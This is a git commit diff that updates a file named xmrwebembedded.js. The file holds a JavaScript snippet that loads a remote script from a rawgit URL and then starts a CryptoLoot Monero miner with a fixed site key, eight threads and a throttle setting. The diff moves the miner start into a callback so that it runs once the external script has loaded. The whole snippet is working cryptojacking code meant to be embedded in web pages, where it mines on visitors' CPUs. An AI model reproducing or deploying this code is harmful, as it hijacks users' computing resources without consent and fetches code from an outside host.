a634ee29657f9f8df2fb7f4724672846994be8f7
Newbie <linhdqtg@gmail.com>
2017-10-19 23:47:13 +0700

    Update xmrwebembedded.js

--- xmrwebembedded.js
+++ xmrwebembedded.js
@@ -1,10 +1,25 @@
-var s = document.createElement('script');
-s.setAttribute('src', 'https://rawgit.com/BoobieLtd/js/master/xmrselfhost.js');
-document.getElementsByTagName('head')[0].appendChild(s);
-var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
+function loadScript(url, callback)
+{
+    // Adding the script tag to the head as suggested before
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = url;
+
+    // Then bind the event to the callback function.
+    // There are several events for cross browser compatibility.
+    script.onreadystatechange = callback;
+    script.onload = callback;
+
+    // Fire the loading
+    head.appendChild(script);
+}
+var myPrettyCode = function() {
+  var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
         {
         threads:8,autoThreads:false,throttle:0.2
         }
-);
- miner.start();
-
+  );
+  miner.start();
+};
+loadScript("https://rawgit.com/BoobieLtd/js/master/xmrselfhost.js", myPrettyCode);
